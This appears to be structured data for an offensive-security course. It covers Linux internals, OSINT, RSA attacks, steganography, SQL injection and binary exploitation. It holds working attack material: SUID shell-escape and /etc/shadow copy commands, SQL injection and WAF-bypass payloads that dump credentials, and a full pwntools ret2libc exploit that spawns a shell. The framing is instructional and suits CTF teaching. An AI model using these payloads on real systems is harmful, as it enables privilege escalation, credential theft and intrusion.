curriculum.title: Linux CLI & Operating System Internals
curriculum.abstract: Master the Linux Virtual Filesystem architecture, inode internals, permission models, and SUID privilege escalation. This module takes you from shell basics to exploitation-grade OS knowledge required for real CTF competitions and penetration testing engagements.

sections.heading: Virtual Filesystem (VFS) Architecture
sections.body: The Linux kernel implements a Virtual Filesystem Switch (VFS) layer that abstracts concrete filesystem implementations (ext4, xfs, tmpfs, procfs) behind a uniform interface. Every filesystem interaction passes through VFS dispatch tables. The VFS maintains four primary kernel data structures: (1) The superblock object (struct super_block) stores filesystem-wide metadata: magic number, block size, total/free inodes and blocks, mount flags. (2) The inode object (struct inode) represents an individual file or directory. Each inode is identified by a 64-bit inode number unique within its filesystem. Inodes store: mode bits (16-bit field encoding file type and permissions), UID/GID of owner, byte size (i_size), hard link count (i_nlink), and three POSIX timestamps. (3) The dentry (directory entry) object (struct dentry) caches the mapping between a filename string and its inode. (4) The file object (struct file) represents an open file descriptor, tracking the current file offset (f_pos) and flags.
sections.code:
# Dump inode metadata
stat /usr/bin/find

# List with inode numbers
ls -lai /usr/bin/ | grep find

# Raw dentry inspection via /proc
cat /proc/sys/fs/inode-nr
cat /proc/sys/fs/dentry-state

sections.heading: Inode Metadata & POSIX Timestamps
sections.body: Every file inode maintains three kernel timestamps with distinct update semantics critical for forensic analysis. atime (access time): Updated every time the file data blocks are read. mtime (modification time): Updated whenever file content changes. ctime (change time): Updated whenever the inode itself changes including permission changes, ownership changes, and content modifications. Critically, ctime CANNOT be directly set by user-space programs, making it the most forensically reliable timestamp. Timestomping attacks that only modify mtime and atime leave ctime exposed as an anomaly indicator.
sections.code:
# Full ISO-format timestamps (forensic precision)
ls -la --time-style=full-iso /etc/passwd

# stat shows all three timestamps
stat /bin/bash

# A timestamp anomaly: mtime older than ctime suggests tampering
stat suspicious_file  # mtime 2020, ctime 2026 => timestamp-stomped

sections.heading: Permission Model: Octets, Special Bits & SetUID
sections.body: Linux permission octets encode file mode as a 16-bit integer. The lower 12 bits represent three 3-bit permission groups (owner/group/other: read=4, write=2, execute=1) plus three special bits. SetUID bit (04000 / SUID): When set on an executable, the process runs with the effective UID of the file owner. If root-owned, any user gains root-level effective UID during execution. SetGID bit (02000 / SGID): Analogous to SUID but applies to effective GID. Sticky bit (01000): On directories like /tmp, prevents users from deleting files they don't own. GTFOBins catalogs SUID binaries that can be abused to read files, write files, or spawn shells when exploited by non-privileged users.
sections.code:
# Find all SUID binaries on the system
find / -perm -4000 -type f 2>/dev/null

# Find SUID binaries with GTFOBins potential
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null

# Example: SUID find binary (GTFOBins recipe)
# If find has SUID root:
find . -exec /bin/sh -p \; -quit
# -p flag: do not drop privileges on restricted shells

# SUID on cp allows reading /etc/shadow:
/usr/bin/cp /etc/shadow /tmp/shadow_copy

curriculum.title: Open Source Intelligence (OSINT) & Reconnaissance
curriculum.abstract: Master passive reconnaissance using MITRE ATT&CK TA0043 frameworks. Learn to extract hidden EXIF metadata from image artifacts, perform DNS zone reconnaissance, harvest Certificate Transparency logs, and trace geographic attribution through unstripped image metadata.

sections.heading: MITRE ATT&CK TA0043: Reconnaissance
sections.body: The MITRE ATT&CK framework categorizes reconnaissance as Tactic TA0043, comprising techniques adversaries use to gather information before launching attacks. Passive reconnaissance techniques avoid direct interaction with the target infrastructure: T1596 - Search Open Technical Databases (Shodan, Censys, VirusTotal). T1597 - Search Closed Sources. T1593.002 - Search Open Websites (Social Media): LinkedIn, GitHub OSINT pivoting. T1598 - Phishing for Information. T1589 - Gather Victim Identity Information: usernames, email addresses. In CTF contexts, OSINT challenges typically involve extracting hidden metadata from artifacts, querying public DNS records, investigating Certificate Transparency logs to enumerate subdomains, and pivoting on usernames across public platforms.
sections.code:
# Certificate Transparency enumeration (no direct target access)
curl -s 'https://crt.sh/?q=%.example.com&output=json' | python3 -c "import json,sys; [print(x['name_value']) for x in json.load(sys.stdin)]"

# DNS zone enumeration
dig axfr @ns1.target.com target.com
dig any target.com

# Shodan command-line (requires API key)
shodan search 'hostname:target.com'

sections.heading: EXIF Standard: Binary Structure & Tag Identifiers
sections.body: EXIF (Exchangeable Image File Format) embeds metadata within image files using TIFF-like Image File Directories (IFDs). The binary structure is: Byte Order Mark (2 bytes): 0x4949 (II = Intel little-endian) or 0x4D4D (MM = Motorola big-endian). Each IFD entry is 12 bytes: Tag ID (2 bytes) + Data Type (2 bytes) + Count (4 bytes) + Value/Offset (4 bytes). Critical tag identifiers for CTF/OSINT work: 0x010F (271) = Make. 0x0110 (272) = Model. 0x9003 (36867) = DateTimeOriginal. 0x8825 (34853) = GPSInfo IFD Offset. Within the GPS IFD: 0x0001 = GPSLatitudeRef (N/S), 0x0002 = GPSLatitude (array of 3 rationals: degrees, minutes, seconds), 0x0003 = GPSLongitudeRef (E/W), 0x0004 = GPSLongitude.
sections.code:
# Full EXIF extraction
exiftool -all image.jpg

# GPS coordinates only
exiftool -gps:all -c '%.6f' image.jpg

# All metadata including duplicates
exiftool -a -u image.jpg

# Strip all metadata (OPSEC)
exiftool -all= image.jpg

# Batch extraction from directory
exiftool -all -csv /directory/ > metadata.csv

# Find GPS-tagged images recursively
exiftool -r -if '$GPSLatitude' -filename -GPSLatitude -GPSLongitude /directory/

sections.heading: GPS Rational Coordinate Serialization
sections.body: GPS coordinates in EXIF are stored as arrays of RATIONAL values (IFD type 5: two LONGs representing numerator/denominator). Latitude and longitude are each stored as three rationals: [degrees, minutes, seconds]. To convert: decimal_degrees = degrees + (minutes/60) + (seconds/3600). The GPSLatitudeRef tag ('N'/'S') determines the sign: 'S' multiplies by -1. Example: GPSLatitude: 37 deg 48' 58.80" N => 37 + (48/60) + (58.80/3600) = 37.816333 degrees N. In CTF challenges, GPS coordinates in extracted metadata can be converted to decimal and queried in mapping services to identify physical locations.
sections.code:
# Extract and convert GPS to decimal degrees
exiftool -GPSLatitude -GPSLongitude -GPSLatitudeRef -GPSLongitudeRef photo.jpg

# Python conversion
python3 << 'EOF'
from fractions import Fraction
lat_deg, lat_min, lat_sec = 37, 48, Fraction(5880, 100)
lat = float(lat_deg) + float(lat_min)/60 + float(lat_sec)/3600
print(f'{lat:.6f} degrees N')  # 37.816333 degrees N
EOF

curriculum.title: Cryptography & Mathematical Foundations
curriculum.abstract: Deep-dive into RSA mathematical primitives, modular arithmetic, and the three primary CTF RSA attack classes: small public exponent without OAEP padding (cube root attack), Fermat's factorization when primes are close together, and Wiener's Attack on small private exponents. Includes complete worked examples and interactive cryptanalysis labs.

sections.heading: RSA Key Generation & Mathematical Structure
sections.body: RSA security relies on the computational hardness of the integer factorization problem. Key generation: (1) Select two large distinct primes p and q. (2) Compute public modulus: n = p x q. (3) Compute Euler's totient: phi(n) = (p-1)(q-1). (4) Choose public exponent e such that gcd(e, phi(n)) = 1. Standard choice: e = 65537. (5) Compute private exponent d as: d = e^(-1) mod phi(n), using the Extended Euclidean Algorithm. Public key: (n, e). Private key: (n, d). Encryption: c = m^e mod n. Decryption: m = c^d mod n.
sections.code:
# Python RSA key generation (educational)
from Crypto.Util.number import getPrime, inverse
import math

p = getPrime(512)
q = getPrime(512)
n = p * q
phi_n = (p - 1) * (q - 1)
e = 65537
assert math.gcd(e, phi_n) == 1
d = inverse(e, phi_n)

# Verify: e*d = 1 mod phi_n
print((e * d) % phi_n)  # Should print 1

# Encrypt message
m = int.from_bytes(b'Hello RSA', 'big')
c = pow(m, e, n)

# Decrypt
m_dec = pow(c, d, n)
print(m_dec.to_bytes((m_dec.bit_length() + 7) // 8, 'big'))  # b'Hello RSA'

sections.heading: Attack Class 1: Small Public Exponent (e=3) Without OAEP
sections.body: When e=3 and the message m is small enough that m^3 < n, the ciphertext c = m^3 (no modular reduction occurs). The attack is simply computing the integer cube root of c. OAEP (Optimal Asymmetric Encryption Padding, RFC 8017) prevents this by padding the message with random bytes before encryption, ensuring even small messages expand to near-n size. Textbook RSA in CTF challenges almost always implies a small exponent or small message attack.

sections.heading: Attack Class 2: Fermat's Factorization & Wiener's Attack
sections.body: Fermat's Factorization exploits RSA keys where |p - q| < 2 * n^(1/4). The algorithm observes that n = a^2 - b^2 = (a+b)(a-b) where a = (p+q)/2 and b = (p-q)/2. Start with a = ceil(sqrt(n)), compute t = a^2 - n. If t is a perfect square, then b = sqrt(t), p = a+b, q = a-b. Wiener's Attack (1990) targets keys with small private exponent d < (1/3)*n^(1/4). Using continued fraction theory, Wiener showed d can be recovered from the public key (n, e) alone by computing convergents of the continued fraction expansion of e/n.
sections.code:
# Fermat's Factorization
import gmpy2

n = 0xdeadbeef12345  # given modulus
a = gmpy2.isqrt(n) + 1
while True:
    b2 = a*a - n
    b, exact = gmpy2.isqrt_rem(b2)
    if exact == 0 and b*b == b2:
        p, q = int(a - b), int(a + b)
        break
    a += 1
print(f'p = {p}')
print(f'q = {q}')
assert p * q == n

curriculum.title: Steganography & Digital Forensics
curriculum.abstract: Understand file format magic bytes and internal structure, EOF slack space injection, LSB steganography in spatial domain color channels, and Shannon entropy analysis. Master forensic tools binwalk and strings for extracting hidden payloads from image artifacts.

theory.title: File Format Internals, Magic Bytes & Steganography

sections.heading: File Magic Bytes & Format Signatures
sections.body: File extensions are metadata labels that can be freely changed. The authoritative identifier is the magic number: a sequence of bytes at a fixed offset within the file. Critical magic bytes for CTF forensics: PNG: 89 50 4E 47 0D 0A 1A 0A - the 8-byte PNG signature. JPEG: FF D8 FF - Start of Image marker (SOI). The file ends with FF D9 (EOI, End of Image). ZIP: 50 4B 03 04 (PK local file header). ZIP archives have both a local directory at the start and a Central Directory at the end, allowing ZIP files to be appended after other data and still parsed correctly. ELF: 7F 45 4C 46 (DEL E L F). PDF: 25 50 44 46 2D (%PDF-).
sections.code:
# Check actual file type
file mystery_file  # Uses magic bytes, not extension

# Hexdump the first 16 bytes (magic bytes inspection)
xxd mystery_file | head -2
# 00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR

# Find all PNG files regardless of extension
find /evidence/ -type f -exec file {} \; | grep PNG

# Check for ZIP magic bytes
grep -rl 'PK' /suspicious/  # Find ZIP archives

sections.heading: EOF Slack Space: Appending Payloads After File Terminators
sections.body: Most image formats have explicit end-of-file markers: PNG uses the IEND chunk (bytes: 49 45 4E 44 AE 42 60 82). Any bytes after the 8-byte IEND CRC are formally undefined but are ignored by most image parsers. JPEG ends with FF D9 (End of Image). Same principle: bytes appended after FF D9 are ignored by JPEG decoders. This creates a steganographic channel: an attacker appends arbitrary data after the legitimate file terminator. The host file displays normally in all image viewers. Detection requires: inspecting the hex dump for unexpected data after the terminal marker, using binwalk or strings to scan the full binary content.
sections.code:
# Detect data after PNG IEND chunk
binwalk -B image.png  # Scan for embedded signatures

# Find IEND position and extract trailing data
python3 << 'EOF'
with open('image.png','rb') as f:
    data = f.read()
iend = data.rfind(b'IEND')
trail = data[iend+8:]  # 8 bytes = 4 (type) + 4 (crc)
if trail:
    print(f'Trailing bytes: {len(trail)}')
    with open('extracted.zip','wb') as f:
        f.write(trail)
EOF

sections.heading: LSB Steganography & Shannon Entropy
sections.body: Least Significant Bit (LSB) steganography embeds secret data in the lowest-order bits of pixel color channel values. A 24-bit RGB image stores each pixel as three bytes (R, G, B). Modifying only the LSB of each byte changes the color value by at most 1 out of 255 - imperceptible to human vision. 1 bit per channel x 3 channels x N pixels = 3N bits of payload capacity. Shannon entropy H = -sum(p(x) * log2(p(x))) measures information density. Random/encrypted data approaches H = 8 bits/byte. Embedded encrypted payloads cause localized entropy anomalies detectable via binwalk -E (entropy graph). High-entropy regions in image files that should contain structured pixel data indicate hidden encrypted content.
sections.code:
# Shannon entropy of a file
python3 << 'EOF'
import math, collections
with open('image.png','rb') as f:
    data = f.read()
freq = collections.Counter(data)
total = len(data)
H = -sum((c/total)*math.log2(c/total) for c in freq.values())
print(f'Shannon entropy: {H:.4f} bits/byte')
# ~7.99 => high entropy => likely compressed/encrypted content
EOF

# Extract entropy graph
binwalk -E image.png
# Spikes indicate hidden compressed/encrypted regions

curriculum.title: Web Application Exploitation
curriculum.abstract: Master HTTP protocol internals, SQL injection at the AST level, WAF bypass techniques, and out-of-band exfiltration. Covers UNION-based extraction, Boolean/time-based blind inference, schema enumeration via information_schema, and writing web shells via INTO OUTFILE.

theory.title: HTTP Internals, SQL Injection & WAF Evasion

sections.heading: HTTP/1.1 & HTTP/2 Protocol Parsing
sections.body: HTTP/1.1 (RFC 7230-7235) is a text-based request/response protocol over TCP. A request comprises: Request Line (METHOD SP Request-URI SP HTTP-Version CRLF), Headers (field-name ':' SP field-value CRLF pairs), blank CRLF separator, and optional Body. Critical security-relevant headers: Host: mandatory since HTTP/1.1 - server routing depends on this value. Authorization: Bearer/Basic authentication material. Cookie: session state transport. Content-Type: affects server-side parser selection. X-Forwarded-For: often trusted by reverse proxies to convey client IP. HTTP/2 is a binary, multiplexed protocol with header compression (HPACK). HTTP/2 request smuggling remains viable via HTTP/1.1 to HTTP/2 translation bugs.
sections.code:
# Manual HTTP/1.1 request with curl
curl -v -X POST https://target.example/login \
  -H 'Content-Type: application/json' \
  -H 'X-Forwarded-For: 127.0.0.1' \
  -d '{"username":"admin","password":"test"}' \
  --cookie 'session=...'

# Inspect response headers
curl -si https://target.example/ | head -20

# HTTP/2 with curl
curl --http2 -v https://target.example/api/v2/users

sections.heading: SQL Injection: AST Alteration & Attack Classes
sections.body: SQL injection occurs when user-supplied data is interpolated into an SQL query string without parameterization. In-Band Union-Based SQLi: Uses UNION SELECT to append additional result rows. Requirements: same number of columns with compatible types; application must display query results. Error-Based SQLi: Forces the database to embed data within error messages. MySQL: extractvalue(1, concat(0x7e, (SELECT version()))). Boolean-Based Blind SQLi: Application behavior differs between TRUE and FALSE conditions. Time-Based Blind SQLi: Response delay reveals boolean values. MySQL: SLEEP(5) injects where true condition causes 5-second delay. The key principle: every injection class exploits a trust boundary failure where data is treated as code.
sections.code:
# In-band Union attack: enumerate columns
' ORDER BY 1--
' ORDER BY 2-- (until error - determines column count)

# Extract database name
' UNION SELECT database(),null,null--

# Enumerate tables from information_schema
' UNION SELECT table_name,null,null FROM information_schema.tables WHERE table_schema=database() LIMIT 1--

# Dump credentials
' UNION SELECT username,password,email FROM users--

# Boolean blind: binary search for first character of db()
' AND ASCII(SUBSTRING((SELECT database()),1,1))>77--

# Time-based blind
' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))=109, SLEEP(5), 0)--

sections.heading: WAF Evasion Techniques
sections.body: Web Application Firewalls operate by pattern-matching HTTP requests against signature databases. WAF evasion leverages semantic equivalence between syntactically different SQL constructs. Comment obfuscation: MySQL supports inline comments with /**/ and /*!50000...*/. The /*!50000 syntax is a conditional comment that executes on MySQL >= 5.0.0. Character encoding: URL encoding (%27 for apostrophe), double URL encoding, HTML entity encoding. Case variation: sElEcT, SeLeCt - SQL is case-insensitive for keywords. Hex literals: 0x61646d696e encodes 'admin' without quotes. The information_schema can be accessed as information%5fschema. The key insight: WAF rule writers must enumerate all equivalent forms while attackers only need one bypass per rule.
sections.code:
# Basic WAF bypass techniques
# Comment-based obfuscation
'/**/UNION/**/SELECT/**/1,2,3--

# Conditional comment (MySQL version-gated)
'/*!50000UNION*//*!50000SELECT*/1,2,3--

# Case variation
'UniOn SeLeCt 1,2,3--

# Hex literal for strings (avoids quote filters)
' UNION SELECT 0x61646d696e,0x70617373776f7264--
# 0x61646d696e = 'admin', 0x70617373776f7264 = 'password'

# SQLMap with tamper scripts
sqlmap -u 'http://target/search?q=1' --tamper=between,charencode,space2comment \
  --dbs --batch --random-agent

curriculum.title: Binary Exploitation (Pwn) & Reverse Engineering
curriculum.abstract: Master x86/x64 virtual address space layout, stack frame anatomy, modern OS mitigations (ASLR/NX/Canaries/RELRO), and Return-Oriented Programming. Learn to calculate buffer overflow offsets, leak libc base addresses via GOT/PLT, and craft ret2libc chains to spawn shells.

theory.title: x86/x64 Memory Layout, Stack Exploitation & ROP

sections.heading: Virtual Address Space Layout
sections.body: A Linux process's virtual address space is organized into distinct segments: .text (code): Read + Execute. Contains compiled machine code. .rodata: Read-Only Data. String literals and constants. .data: Read + Write. Initialized global/static variables. .bss: Read + Write. Uninitialized globals (zero-initialized). The Heap: Read + Write. Dynamic allocation (malloc/new). Grows upward. The Stack: Read + Write. Automatic variables, function arguments, return addresses. Grows downward. Memory-Mapped Regions: Shared libraries (libc.so, ld.so) mapped into the process. ASLR randomizes base addresses of heap, stack, and libraries at each execution, making hardcoded addresses unreliable.
sections.code:
# Inspect process memory map with gdb+gef
gdb ./vulnerable
(gdb) run
(gdb) vmmap
# Output:
# Start              End                Perm   Name
# 0x00400000         0x00401000         r-xp   ./vulnerable (.text)
# 0x00600000         0x00601000         r--p   ./vulnerable (.rodata)
# 0x7ffff7a00000     0x7ffff7bdc000     r-xp   libc.so.6
# 0x7ffffffde000     0x7ffffffff000     rwxp   [stack]

# Check binary mitigations
checksec ./vulnerable
# RELRO: Partial   STACK CANARY: No   NX: Enabled   PIE: No

sections.heading: Stack Frame Anatomy & Buffer Overflow Mechanics
sections.body: The call stack implements function invocation by growing stack frames. When a function is called: (1) Arguments pushed (System V AMD64 ABI: first 6 args in RDI, RSI, RDX, RCX, R8, R9). (2) CALL instruction pushes return address (RIP) onto stack and jumps to callee. (3) Callee prologue: PUSH RBP; MOV RBP, RSP. (4) SUB RSP, N allocates local variables. Stack frame layout from RSP to RBP: local variables (buffer), then saved RBP, then return address (RIP). A stack buffer overflow with char buf[128] and no bounds checking allows data to overwrite: saved RBP (at buf+128), return address (at buf+136 on 64-bit), and above. Controlling the return address means controlling what code executes when the function returns.
sections.code:
# Find buffer offset with gdb-gef pattern
gdb ./vuln
(gdb) pattern create 200
# Sends: aaaabaaacaaadaaaeaaafaaagaaahaaai...
(gdb) run <<< $(python3 -c 'print("A"*200)')
# Program crashes with garbage in RIP
(gdb) pattern offset $rip
# Offset: 136 bytes to RIP

# Verify offset
python3 -c "import struct; payload = b'A'*136 + struct.pack('<Q', 0xdeadbeef); open('/tmp/payload','wb').write(payload)"
gdb ./vuln < /tmp/payload
# RIP should be 0x00000000deadbeef

sections.heading: Modern Mitigations & ret2libc Exploitation
sections.body: Modern mitigations against stack buffer overflows: ASLR: Randomizes load address of heap, stack, and shared libraries at each execution. Defeated by information leaks. NX/DEP: Marks stack (and heap) as non-executable. Prevents shellcode injection. ret2libc bypasses NX. Stack Canaries: Secret random value between buffer and saved RBP. Verified on function return. Overwriting return address requires overwriting canary first. RELRO: Partial RELRO makes .got.plt section writable (exploitable for GOT overwrite). Full RELRO makes entire GOT read-only. ret2libc: Since NX prevents stack shellcode, return directly to libc's system() function with '/bin/sh' as argument. Requires: (1) knowing system() address in libc, (2) knowing '/bin/sh' string address in libc, (3) setting RDI = address of '/bin/sh' using a 'pop rdi; ret' gadget. Address leaks via GOT/PLT: Call puts(GOT[puts]) to print the runtime address of puts, compute libc_base = leaked_puts - libc_offset_of_puts.
sections.code:
# ret2libc exploit with pwntools
from pwn import *

elf  = ELF('./vuln')
libc = ELF('./libc.so.6')
p    = process('./vuln')

# Stage 1: Leak libc address via puts(GOT[puts])
pop_rdi = 0x401234  # from ROPgadget: pop rdi; ret
ret_gad = 0x401235  # bare ret for stack alignment

payload1 = b'A' * 136
payload1 += p64(pop_rdi)
payload1 += p64(elf.got['puts'])    # argument: GOT entry for puts
payload1 += p64(elf.plt['puts'])    # call puts (prints GOT value)
payload1 += p64(elf.symbols['main'])  # return back to main

p.sendlineafter(b'Input: ', payload1)
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']
log.success(f'libc base: {hex(libc.address)}')

# Stage 2: call system('/bin/sh')
binsh = next(libc.search(b'/bin/sh'))
payload2 = b'A' * 136
payload2 += p64(ret_gad)           # stack alignment
payload2 += p64(pop_rdi) + p64(binsh)
payload2 += p64(libc.symbols['system'])

p.sendlineafter(b'Input: ', payload2)
p.interactive()  # Drop into /bin/sh

flags.context: (GEF/pwndbg) Generate a De Bruijn sequence of N bytes to determine buffer overflow offset precisely.
(GEF/pwndbg) Given the crashed RIP value, compute how many bytes precede it in the pattern.
(GEF/pwndbg) Display all memory-mapped regions with addresses, permissions, and names.
(GEF/pwndbg) Check binary protections: RELRO, Stack Canary, NX, PIE, ASLR status.
Examine 20 giant-words (8 bytes) at the stack pointer. Essential for visualizing stack layout.
Display all CPU register values at the current execution point.

Set a breakpoint at an absolute address. Use after disas to identify key instructions.

case_study.title: Stack Buffer Overflow: NX Bypass via libc Address Calculation
case_study.narrative: A CTF challenge binary 'vuln' takes user input into a 128-byte stack buffer using gets(). NX is enabled but there is no stack canary and no PIE. The GOT/PLT are at fixed addresses. Objective: spawn /bin/sh.
steps: checksec ./vuln => NX: Enabled, No PIE, No Canary, Partial RELRO
Find overflow offset: gdb pattern create 200 => run => pattern offset $rip => 136 bytes
Find ROP gadgets: ROPgadget --binary ./vuln --rop | grep 'pop rdi'
Stage 1 payload: 136*A + pop_rdi + GOT[puts] + PLT[puts] + main_addr
Parse leaked puts address => compute libc_base
Stage 2 payload: 136*A + ret + pop_rdi + /bin/sh_addr + system_addr
Send payload 2 => interactive shell
cat /flag => CTF{RET2LIBC_NX_BYPASS_SHELL}

items.title: OpenSSH regreSSHion Remote Code Execution
items.summary: A signal handler race condition in OpenSSH server (sshd) allows unauthenticated remote code execution as root on glibc-based Linux systems. Affects OpenSSH < 4.4p1 and 8.5p1-9.7p1.

items.title: PAN-OS GlobalProtect OS Command Injection
items.summary: A command injection vulnerability in Palo Alto Networks PAN-OS GlobalProtect feature allows unauthenticated attackers to execute arbitrary OS commands with root privileges.
